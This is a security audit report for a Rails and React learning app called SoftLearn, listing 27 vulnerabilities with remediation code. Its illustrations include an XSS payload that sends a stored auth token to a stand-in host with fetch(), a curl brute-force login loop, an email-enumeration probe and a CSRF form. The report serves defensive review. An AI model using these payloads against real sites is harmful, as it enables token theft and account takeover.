# Security Audit & Flaw Analysis Report
## SoftLearn Application - Full-Stack Analysis
**Date:** February 1, 2026  
**Auditor:** Automated Security Analysis  
**Application:** SoftLearn (Rails API + React Frontend)

---

## Executive Summary

This report identifies **27 security vulnerabilities** and **architectural flaws** across the SoftLearn application stack. The issues range from **CRITICAL** to **LOW** severity, with multiple high-risk vulnerabilities requiring immediate attention.

### Severity Breakdown
- 🔴 **CRITICAL:** 6 issues
- 🟠 **HIGH:** 8 issues  
- 🟡 **MEDIUM:** 7 issues
- 🔵 **LOW:** 6 issues

---

## 🔴 CRITICAL VULNERABILITIES

### 1. **Hardcoded Credentials in Version Control**
**Location:** Multiple Docker Compose files  
**Files Affected:**
- `docker-compose.yml`
- `compose.dev.yaml`
- `compose.yaml`

**Issue:**
```yaml
POSTGRES_PASSWORD: postgres
JWT_SECRET: development-secret-key-change-in-production
```

**Risk:** Production-grade secrets exposed in version control. Anyone with repository access can compromise the database and authentication system.

**Impact:**
- Complete database compromise
- JWT token forgery
- Unauthorized system access

**Recommendation:**
- Move ALL secrets to environment variables
- Use Docker secrets or external secret management (e.g., AWS Secrets Manager, Vault)
- Add `.env` files to `.gitignore`
- Rotate all exposed credentials immediately

---

### 2. **No Rate Limiting on Authentication Endpoints**
**Location:** `backend/app/controllers/api/sessions_controller.rb`

**Issue:** Login, signup, and password reset endpoints have no rate limiting, enabling:
- Brute force attacks on user credentials
- OTP brute forcing (1 million attempts for 6-digit OTP)
- Account enumeration via timing attacks
- Denial of Service (DoS) through API flooding

**Attack Scenario:**
```bash
# Attacker can send unlimited login attempts
while true; do
  curl -X POST http://api/sign-in -d '{"email":"admin@example.com","password":"attempt123"}'
done
```

**Recommendation:**
- Implement `rack-attack` gem for rate limiting
- Limit login attempts to 5 per IP per 15 minutes
- Implement exponential backoff after failed attempts
- Add CAPTCHA after 3 failed attempts

**Example Fix:**
```ruby
# Gemfile
gem 'rack-attack'

# config/initializers/rack_attack.rb
Rack::Attack.throttle("login/ip", limit: 5, period: 15.minutes) do |req|
  req.ip if req.path == '/api/sign-in' && req.post?
end
```

---

### 3. **Insecure Password Reset OTP Mechanism**
**Location:** `backend/app/controllers/api/password_resets_controller.rb`

**Multiple Issues:**
```ruby
# 1. Weak OTP: Only 6 digits = 1 million combinations
otp = rand(100000..999999).to_s

# 2. OTP returned in API response (development mode leak risk)
payload[:otp] = otp unless Rails.env.production?

# 3. No account lockout after failed OTP attempts
# 4. OTP valid for 10 minutes (too long)
# 5. No notification when OTP is requested (users won't know about attack)
```

**Risk:**
- Brute force attack on 6-digit OTP (~10 minutes to crack with no rate limiting)
- Accidental production deployment with OTP exposure
- Account takeover via password reset

**Recommendation:**
- Use cryptographically secure tokens (32+ characters)
- Implement rate limiting (3 attempts max)
- Reduce OTP validity to 5 minutes
- Send email notifications for ALL password reset requests
- Invalidate OTP after successful use (currently missing)
- Remove OTP from response entirely

**Secure Alternative:**
```ruby
# Use secure token instead of OTP
reset_token = SecureRandom.urlsafe_base64(32)
user.update(
  reset_token_digest: BCrypt::Password.create(reset_token),
  reset_token_expires_at: 5.minutes.from_now
)
# Send token via email only - never in response
```

---

### 4. **JWT Secret Fallback in Production**
**Location:** `backend/app/models/user.rb` (lines 23-29)

**Issue:**
```ruby
def self.jwt_secret
  secret = ENV['JWT_SECRET']
  if secret.blank?
    return 'development-secret-key-change-in-production' unless Rails.env.production?
    raise 'JWT_SECRET is required in production'
  end
  secret
end
```

**Risk:** If deployment environment is misconfigured and doesn't set `RAILS_ENV=production`, the development secret will be used in production, allowing attackers to forge tokens.

**Scenario:**
```bash
# Misconfigured deployment
docker run softlearn-backend  # Defaults to development mode
# Now using weak JWT secret in production!
```

**Recommendation:**
- Fail fast: Raise error if JWT_SECRET is missing in ANY environment
- Remove development fallback entirely
- Add startup check to verify secret strength

```ruby
def self.jwt_secret
  secret = ENV['JWT_SECRET']
  raise 'JWT_SECRET must be set' if secret.blank?
  raise 'JWT_SECRET too weak' if secret.length < 32
  secret
end
```

---

### 5. **Token Storage in localStorage (XSS Vulnerability)**
**Location:** `frontend/src/api/handleApis.js`, `frontend/src/components/auth/SignIn.jsx`

**Issue:**
```javascript
// Vulnerable to XSS attacks
localStorage.setItem('authToken', data.token);
localStorage.setItem("token", JSON.stringify(data.token));
```

**Risk:** If any XSS vulnerability exists in the frontend, attackers can steal tokens:
```javascript
// Attacker's XSS payload
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('authToken'))
</script>
```

**Additional Issues:**
- Tokens stored in **TWO** different keys (`authToken` and `token`) causing inconsistency
- JSON.stringify wrapping token string unnecessarily

**Recommendation:**
- Use `httpOnly` cookies for token storage (immune to XSS)
- Implement SameSite cookie policy
- Remove localStorage token storage entirely

**Backend Fix:**
```ruby
# sessions_controller.rb
cookies.signed[:auth_token] = {
  value: token,
  httponly: true,
  secure: Rails.env.production?,
  same_site: :lax
}
```

---

### 6. **No CSRF Protection on State-Changing Operations**
**Location:** `backend/config/application.rb`

**Issue:** API configured as `config.api_only = true` but uses cookies/sessions without CSRF tokens.

**Current Config:**
```ruby
config.api_only = true
config.session_store :cookie_store, key: '_softlearn_softverse'
config.middleware.use ActionDispatch::Cookies
config.middleware.use config.session_store, config.session_options
```

**Risk:** Cross-Site Request Forgery attacks possible on endpoints like:
- `/api/logout`
- `/api/forgot-password/reset-password`

**Attack Scenario:**
```html
<!-- Attacker's malicious site -->
<form action="https://softlearn.com/api/logout" method="POST">
  <input type="submit" value="Click for free prize!">
</form>
```

**Recommendation:**
- Enable CSRF protection: `protect_from_forgery with: :exception`
- Use CSRF tokens in all state-changing requests
- Validate Origin/Referer headers
- Implement double-submit cookie pattern

---

## 🟠 HIGH SEVERITY ISSUES

### 7. **Missing Input Validation on Critical Fields**
**Location:** `backend/app/controllers/api/sessions_controller.rb`

**Issue:** No validation on password complexity, length, or format:
```ruby
# Accepts ANY password
def user_params
  payload.permit(:account_type, :email, :password, :first_name, :last_name)
end
```

**Risk:**
- Users can set weak passwords like "123", "password"
- No minimum length enforcement
- No complexity requirements

**Recommendation:**
```ruby
# app/models/user.rb
validates :password, length: { minimum: 12 },
                     format: { with: /\A(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/ }
```

---

### 8. **Email Enumeration Vulnerability**
**Location:** `backend/app/controllers/api/password_resets_controller.rb`

**Issue:**
```ruby
if user.nil?
  return render json: { error: 'User not found with this email' }, status: :not_found
end
```

**Risk:** Attackers can determine which emails are registered:
```bash
curl -X POST /api/forgot-password/send-otp -d '{"email":"test@example.com"}'
# Response: "User not found" = email not registered
# Response: "OTP sent" = email exists
```

**Recommendation:**
- Return generic message regardless of email existence
- Always return success with same timing

```ruby
# Return success even if user doesn't exist
render json: { message: 'If the email exists, an OTP has been sent' }, status: :ok
```

---

### 9. **SQL Injection Risk via Unparameterized Queries**
**Location:** `backend/app/controllers/api/sessions_controller.rb`

**Issue:**
```ruby
user = User.find_by(email: params[:email])
```

**Current Status:** Rails ActiveRecord provides protection by default, BUT:
- Direct SQL queries elsewhere could be vulnerable
- Migration to raw SQL would introduce risk

**Recommendation:**
- Audit for any raw SQL queries: `User.where("email = '#{params[:email]}'")` ⚠️
- Ensure strong parameters are used consistently
- Add SQL injection tests

---

### 10. **Weak CORS Configuration**
**Location:** `backend/config/initializers/cors.rb`

**Issue:**
```ruby
allow do
  origins "localhost:5174", "localhost:5173", "127.0.0.1:5174", "127.0.0.1:5173"
  resource "*",
    headers: :any,
    methods: [:get, :post, :put, :patch, :delete, :options, :head],
    credentials: true
end
```

**Problems:**
- Development origins configured for production deployment
- `headers: :any` too permissive
- `methods` allows unnecessary verbs (PUT, PATCH, HEAD)

**Recommendation:**
```ruby
allow do
  origins ENV.fetch('ALLOWED_ORIGINS', 'http://localhost:5173').split(',')
  resource "/api/*",
    headers: ["Authorization", "Content-Type"],
    methods: [:get, :post, :options],
    credentials: true,
    max_age: 600
end
```

---

### 11. **Information Disclosure in Error Messages**
**Location:** Multiple controllers

**Issue:**
```ruby
render json: { error: @user.errors.full_messages }, status: :unprocessable_entity
```

**Example Leak:**
```json
{
  "error": [
    "Password digest can't be blank",
    "Email has already been taken by user ID 42"
  ]
}
```

**Risk:** Reveals internal field names, database structure, and implementation details.

**Recommendation:**
```ruby
render json: { error: 'Registration failed. Please check your input.' }, status: :unprocessable_entity
# Log detailed errors server-side only
Rails.logger.error(@user.errors.full_messages)
```

---

### 12. **No Token Expiration Validation**
**Location:** `backend/app/models/user.rb`

**Issue:**
```ruby
def self.decode_token(token)
  decoded = JWT.decode(token, jwt_secret)[0]
  find(decoded['user_id'])
rescue JWT::DecodeError, ActiveRecord::RecordNotFound
  nil
end
```

**Problem:** JWT library validates expiration, but error handling is generic. No logging of expired token attempts.

**Recommendation:**
```ruby
def self.decode_token(token)
  decoded = JWT.decode(token, jwt_secret, true, { algorithm: 'HS256' })[0]
  find(decoded['user_id'])
rescue JWT::ExpiredSignature
  Rails.logger.warn("Expired token attempt")
  nil
rescue JWT::DecodeError, ActiveRecord::RecordNotFound
  Rails.logger.warn("Invalid token attempt")
  nil
end
```

---

### 13. **Duplicate User Creation Endpoints**
**Location:** `sessions_controller.rb` and `users_controller.rb`

**Issue:** Two different registration endpoints with inconsistent logic:
```ruby
# api/sessions#create - Used by frontend
# api/users#create - Unused but active
```

**Risk:**
- Confusion about which endpoint is authoritative
- Different validation rules
- Potential bypass of security controls

**Recommendation:**
- Remove unused `users_controller.rb` entirely
- Consolidate all user creation in one controller
- Add comprehensive tests

---

### 14. **No Password Confirmation on Registration**
**Location:** `sessions_controller.rb#create`

**Issue:** User can register without confirming password, leading to typos and lockouts.

**Recommendation:**
```ruby
validates :password_confirmation, presence: true, on: :create
validates :password, confirmation: true
```

---

## 🟡 MEDIUM SEVERITY ISSUES

### 15. **Token Blacklist Without Expiration Cleanup**
**Location:** `backend/app/models/token_blacklist.rb`

**Issue:** 
```ruby
class TokenBlacklist < ApplicationRecord
  validates :token, presence: true, uniqueness: true
end
```

**Problem:** No mechanism to remove expired tokens from blacklist, leading to:
- Database bloat over time
- Degraded performance
- Storage costs

**Recommendation:**
```ruby
# Add cleanup job
class CleanupExpiredTokensJob < ApplicationJob
  def perform
    TokenBlacklist.where("exp < ?", Time.current).delete_all
  end
end

# Schedule daily
# config/schedule.rb (with whenever gem)
every 1.day, at: '2:00 am' do
  runner "CleanupExpiredTokensJob.perform_now"
end
```

---

### 16. **Missing Database Indexes on Frequently Queried Columns**
**Location:** User model

**Issue:**
```ruby
# No index on email (frequently queried for login)
User.find_by(email: params[:email])
```

**Impact:** Slow queries as user base grows, potential DoS.

**Recommendation:**
```ruby
add_index :tbl_users, :email, unique: true
add_index :tbl_users, :reset_otp
add_index :token_blacklists, :exp
```

---

### 17. **No SSL/TLS Enforcement in Development**
**Location:** `docker-compose.yml`, `compose.dev.yaml`

**Issue:** Development environment uses HTTP, training developers to ignore security.

**Recommendation:**
- Use `mkcert` to generate local SSL certificates
- Configure Puma for HTTPS in development
- Update frontend to use HTTPS URLs

---

### 18. **Inconsistent Error Handling in Frontend**
**Location:** `frontend/src/api/handleApis.js`

**Issue:**
```javascript
if (error.response?.status >= 400 && error.response?.status <= 499) {
  throw new Error(error.response.data?.error || error.response.data?.message || 'Sign in failed');
}
throw error; // Inconsistent error format
```

**Problem:** Some errors return formatted Error objects, others return raw axios errors.

**Recommendation:**
```javascript
// Always return consistent error format
return Promise.reject({
  message: backendError || message || 'An error occurred',
  status: error.response?.status,
  code: error.code
});
```

---

### 19. **Environment Files Tracked in Git**
**Location:** `frontend/.env.development`, `frontend/.env.staging`, `frontend/.env.production`

**Issue:** While these don't contain secrets currently, having environment files in git is a bad practice that will eventually lead to secret leaks.

**Recommendation:**
```bash
# Remove from git
git rm --cached frontend/.env*

# Add to .gitignore
echo ".env*" >> frontend/.gitignore

# Use .env.example as template
cp frontend/.env.development frontend/.env.example
git add frontend/.env.example
```

---

### 20. **No Logging of Security Events**
**Location:** All authentication controllers

**Issue:** No audit trail for:
- Failed login attempts
- Password reset requests
- Token blacklist additions
- Account lockouts

**Recommendation:**
```ruby
# Add security event logger
class SecurityLogger
  def self.log(event, user_id, metadata = {})
    Rails.logger.info({
      event: event,
      user_id: user_id,
      ip: metadata[:ip],
      timestamp: Time.current
    }.to_json)
  end
end

# Usage
SecurityLogger.log('login_failed', nil, { email: params[:email], ip: request.remote_ip })
```

---

### 21. **Missing Content Security Policy (CSP)**
**Location:** Backend and Frontend

**Issue:** No CSP headers configured, allowing:
- Inline script execution
- Third-party script loading
- XSS attack vectors

**Recommendation:**
```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self
  policy.script_src  :self
  policy.style_src   :self, :unsafe_inline
  policy.img_src     :self, :data
  policy.connect_src :self, ENV['API_URL']
end
```

---

## 🔵 LOW SEVERITY ISSUES

### 22. **Debug Console Logs in Production Code**
**Location:** `frontend/src/components/auth/SignUp.jsx`

**Issue:**
```javascript
company && console.log("Company:", company);
student && console.log("Student:", student);
```

**Risk:** Potential information leakage, console spam.

**Recommendation:** Remove or wrap in development check:
```javascript
if (process.env.NODE_ENV === 'development') {
  console.log("Account type:", { company, student });
}
```

---

### 23. **Inconsistent Naming Conventions**
**Location:** Database tables

**Issue:**
```ruby
self.table_name = 'tbl_users'  # Old naming convention
# vs
create_table :token_blacklists  # Rails convention
```

**Recommendation:** Standardize on Rails conventions without `tbl_` prefix.

---

### 24. **No API Versioning**
**Location:** Routes

**Issue:**
```ruby
namespace :api do
  post '/sign-in'  # No version indicator
end
```

**Problem:** Cannot introduce breaking changes without affecting existing clients.

**Recommendation:**
```ruby
namespace :api do
  namespace :v1 do
    post '/sign-in'
  end
end
```

---

### 25. **Missing Health Check Authentication**
**Location:** `backend/app/controllers/api/health_controller.rb`

**Issue:** Health endpoint returns database connection status without authentication.

**Risk:** Information disclosure about infrastructure.

**Recommendation:**
- Add basic auth for health endpoint
- Or limit to internal IP ranges
- Return minimal info in public endpoint

---

### 26. **No Request ID Tracking**
**Location:** Backend

**Issue:** No correlation IDs for tracing requests across services.

**Recommendation:**
```ruby
# config/application.rb
config.middleware.insert_before Rails::Rack::Logger, Rack::RequestId
```

---

### 27. **Frontend Bundle Size Not Optimized**
**Location:** `frontend/package.json`

**Issue:** No code splitting, lazy loading, or bundle analysis configured.

**Recommendation:**
```javascript
// vite.config.js
export default {
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom', 'react-router-dom'],
          ui: ['react-icons', 'react-toastify']
        }
      }
    }
  }
}
```

---

## Additional Architectural Concerns

### A. **No Input Sanitization**
- User inputs not sanitized for HTML/JavaScript
- Risk of stored XSS if data is rendered unsafely

### B. **No Backup Strategy**
- No evidence of database backup procedures
- No disaster recovery plan

### C. **No Security Headers**
- Missing X-Frame-Options
- Missing X-Content-Type-Options
- Missing Strict-Transport-Security

### D. **Dependency Vulnerabilities**
- No automated dependency scanning
- Recommend: `bundle audit`, `npm audit`

### E. **No Penetration Testing**
- Application should undergo professional security audit before production

---

## Remediation Priority

### Immediate (Within 24 Hours)
1. Remove hardcoded credentials from docker-compose files
2. Implement rate limiting on auth endpoints
3. Fix JWT secret fallback logic
4. Add password validation

### Short Term (Within 1 Week)
5. Migrate from localStorage to httpOnly cookies
6. Fix OTP security issues
7. Implement CSRF protection
8. Add security event logging

### Medium Term (Within 1 Month)
9. Add API versioning
10. Implement proper error handling
11. Add security headers
12. Set up dependency scanning

### Long Term (Ongoing)
13. Regular security audits
14. Penetration testing
15. Security training for team
16. Implement WAF (Web Application Firewall)

---

## Testing Recommendations

### Security Test Suite
```ruby
# spec/security/authentication_spec.rb
describe 'Authentication Security' do
  it 'rate limits login attempts' do
    6.times { post '/api/sign-in', params: { email: 'test@example.com' } }
    expect(response.status).to eq(429)
  end

  it 'prevents password brute force' do
    # Test implementation
  end

  it 'invalidates tokens on logout' do
    # Test implementation
  end
end
```

---

## Compliance Considerations

If handling EU users: **GDPR compliance required**
- Right to data deletion
- Data portability
- Breach notification procedures

If handling US users: **CCPA considerations**
- Data collection transparency
- Opt-out mechanisms

If handling payment data: **PCI-DSS compliance**

---

## Conclusion

The SoftLearn application has a solid architectural foundation but contains **multiple critical security vulnerabilities** that must be addressed before production deployment. The most urgent issues are:

1. Credential exposure in version control
2. Lack of rate limiting enabling brute force attacks
3. Insecure token storage vulnerable to XSS
4. Weak password reset mechanism

**Estimated remediation time:** 2-3 weeks with dedicated security focus.

**Recommended next steps:**
1. Create security-focused sprint
2. Implement automated security testing
3. Conduct code review with security checklist
4. Perform penetration testing
5. Obtain security certification before launch

---

**Report Generated:** February 1, 2026  
**Tools Used:** Manual code review, security best practices analysis  
**Frameworks Referenced:** OWASP Top 10, CWE/SANS Top 25

For questions or clarification on any finding, please refer to the specific file locations and line numbers provided in each section.
